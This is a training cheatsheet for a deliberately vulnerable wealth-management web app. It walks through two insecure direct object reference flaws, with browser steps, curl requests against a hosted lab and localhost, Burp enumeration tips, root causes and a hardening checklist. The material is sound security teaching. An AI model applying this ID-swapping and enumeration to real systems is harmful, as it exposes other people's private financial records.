# Apex Wealth Management — IDOR Lab Cheatsheet

**Lab Environment: For Educational Use Only.**

This application deliberately contains **Insecure Direct Object Reference (IDOR)** flaws for security training. Do not deploy this code to production or expose it on the public internet without isolation.

---

## Live lab (hosted)

| Resource | URL |
|----------|-----|
| **Dashboard (after login)** | [https://main.drajbhm4q3rrn.amplifyapp.com/dashboard/101](https://main.drajbhm4q3rrn.amplifyapp.com/dashboard/101) |
| **Login** | [https://main.drajbhm4q3rrn.amplifyapp.com/login](https://main.drajbhm4q3rrn.amplifyapp.com/login) |
| **Base URL** | `https://main.drajbhm4q3rrn.amplifyapp.com` |

Use the same paths and query strings as localhost, with this base URL (e.g. `/dashboard/103`, `/api/download-statement?id=stmt-103-2024-12`).

---

## Quick start (local)

```bash
npm install
npm run dev
```

Open **http://localhost:3000** → redirects to `/login`.

---

## Demo accounts

| Client ID | Name          | Email              | Password      | Portfolio (approx.) |
|-----------|---------------|--------------------|---------------|---------------------|
| 101       | John Doe      | john@apex.lab      | password101   | $2,450,000          |
| 102       | Jane Smith    | jane@apex.lab      | password102   | $875,000            |
| 103       | Robert Chen   | robert@apex.lab    | password103   | $12,800,000         |
| 104       | Maria Garcia  | maria@apex.lab     | password104   | $189,000            |
| 105       | James Wilson  | james@apex.lab     | password105   | $45,200             |

After any successful login, the app **always** sends you to `/dashboard/101`, regardless of which account you used.

Session cookie: **`apex_session`** (httpOnly). Middleware only checks that this cookie **exists** for `/dashboard/*` routes—it does **not** enforce that the cookie’s user id matches the URL.

---

## Vulnerability 1 — URL-based IDOR (dashboard)

### What’s wrong

Dashboard pages load data using **`user_id` from the URL only**. The server never compares `params.user_id` to the value stored in `apex_session`.

**Affected routes:**

- `/dashboard/[user_id]`
- `/dashboard/[user_id]/accounts`
- `/dashboard/[user_id]/statements`
- `/dashboard/[user_id]/settings`

### Browser exploit

1. Log in as John Doe (`john@apex.lab` / `password101`).
2. You land on `/dashboard/101`.
3. Change the address bar to another client id, for example:
   - **https://main.drajbhm4q3rrn.amplifyapp.com/dashboard/103** → Robert Chen’s $12.8M portfolio
   - **https://main.drajbhm4q3rrn.amplifyapp.com/dashboard/104** → Maria Garcia’s data
   - **https://main.drajbhm4q3rrn.amplifyapp.com/dashboard/105** → James Wilson’s data

   (Local: `http://localhost:3000/dashboard/103`, etc.)

No re-authentication is required. The header and charts update to the victim’s profile.

### What to observe

- **Client ID** in the header changes with the URL.
- **Total portfolio value** jumps dramatically (e.g. 101 → 103).
- **Transactions, allocation pie, and line chart** all reflect the URL user, not the account you logged in with.

### Root cause (for debrief)

`getUserById(user_id)` in `lib/data.ts` is called from `app/dashboard/[user_id]/layout.tsx` and child pages using only the path parameter. The session cookie is ignored for authorization.

---

## Vulnerability 2 — API IDOR (statement download)

### What’s wrong

`GET /api/download-statement?id=<statement_id>` returns a statement JSON file based **only** on the `id` query parameter. There is **no** session check, API key, or ownership validation.

**This route is not protected by middleware** (only `/dashboard/*` requires a cookie).

### Statement IDs (enumeration reference)

| Statement ID        | Owner (userId) | Account label                         |
|---------------------|----------------|---------------------------------------|
| stmt-101-2024-12    | 101            | John Doe — Primary Portfolio          |
| stmt-101-2024-11    | 101            | John Doe — Primary Portfolio          |
| stmt-102-2024-12    | 102            | Jane Smith — Family Trust             |
| stmt-103-2024-12    | 103            | Robert Chen — Institutional           |
| stmt-104-2024-12    | 104            | Maria Garcia — Growth Account         |
| stmt-105-2024-12    | 105            | James Wilson — Starter Portfolio      |

IDs follow the pattern: `stmt-{userId}-{year}-{month}`.

### curl (no cookie required)

Set `BASE` to the hosted lab or localhost:

```bash
BASE="https://main.drajbhm4q3rrn.amplifyapp.com"
# BASE="http://localhost:3000"

# Robert Chen's December statement while you are "logged in" as anyone—or not logged in at all
curl -s "$BASE/api/download-statement?id=stmt-103-2024-12"

# Maria Garcia's statement
curl -s "$BASE/api/download-statement?id=stmt-104-2024-12"

# Save to file
curl -s "$BASE/api/download-statement?id=stmt-103-2024-12" \
  -o robert-statement.json
```

### Browser exploit

1. Log in and open **Statements** for your own user (e.g. `/dashboard/101/statements`).
2. Note a statement id from another user (table above), or from `data/wealth-lab.json`.
3. Open a new tab:

   **https://main.drajbhm4q3rrn.amplifyapp.com/api/download-statement?id=stmt-103-2024-12**

   (Local: `http://localhost:3000/api/download-statement?id=stmt-103-2024-12`)

4. The browser downloads JSON containing `userId: "103"`, `accountLabel`, balances, and `highlights` for Robert Chen.

### In-app button (same flaw)

On `/dashboard/{user_id}/statements`, **Download monthly statement** calls:

```http
GET /api/download-statement?id={statementId}
```

Intercept the request in Burp/DevTools and replace `id` with another user’s statement id.

### Example response fields

```json
{
  "id": "stmt-103-2024-12",
  "userId": "103",
  "month": "December",
  "year": 2024,
  "accountLabel": "Robert Chen — Institutional",
  "openingValue": 12200000,
  "closingValue": 12550000,
  "netChange": 350000,
  "highlights": ["..."]
}
```

### Root cause (for debrief)

`app/api/download-statement/route.ts` calls `getStatementById(id)` with no call to session/cookie logic. See `lib/data.ts`.

---

## Suggested lab flow (15–20 min)

| Step | Action | Expected result |
|------|--------|-----------------|
| 1 | Log in as `john@apex.lab` | Dashboard shows John, ~$2.45M |
| 2 | Edit URL to `/dashboard/103` | UI shows Robert Chen, ~$12.8M (IDOR #1) |
| 3 | `curl` stmt-104 id without cookie | Maria’s statement JSON (IDOR #2) |
| 4 | Discuss fixes | Bind resources to session user id; authorize every API object access |

---

## Hardening checklist (answers for students)

1. **Dashboard:** After login, redirect to `/dashboard/{sessionUserId}` only. On every request, verify `params.user_id === session.userId` (or use opaque server-side session, not client-controlled ids in the URL).
2. **API:** Require authentication; load statement by id **and** verify `statement.userId === session.userId` (or use signed, non-guessable tokens tied to the session).
3. **Middleware:** Authentication ≠ authorization—presence of `apex_session` is not enough.
4. **IDs:** Prefer unpredictable UUIDs; rate-limit and monitor enumeration on download endpoints.

---

## Files to inspect

| File | Relevance |
|------|-----------|
| `data/wealth-lab.json` | All users, balances, statement ids |
| `lib/auth.ts` | Credentials; `apex_session` |
| `lib/data.ts` | `getUserById`, `getStatementById` (no auth) |
| `app/dashboard/[user_id]/layout.tsx` | URL-only profile load |
| `app/api/download-statement/route.ts` | Vulnerable GET handler |
| `middleware.ts` | Cookie presence only on `/dashboard/*` |
| `app/login/actions.ts` | Always redirects to `/dashboard/101` |

---

## Burp Suite tips

- **Proxy:** Log in, browse dashboard, change `[user_id]` in history and replay.
- **Repeater:** `GET /api/download-statement?id=stmt-102-2024-12` with and without `Cookie: apex_session=101`—response should be identical for the same `id`.
- **Intruder:** Payload on `id` with list `stmt-101-2024-12` … `stmt-105-2024-12`; compare response length and `userId` in body.

---

## Disclaimer

Unauthorized access to systems you do not own or lack permission to test is illegal. Use this application only in authorized lab environments.
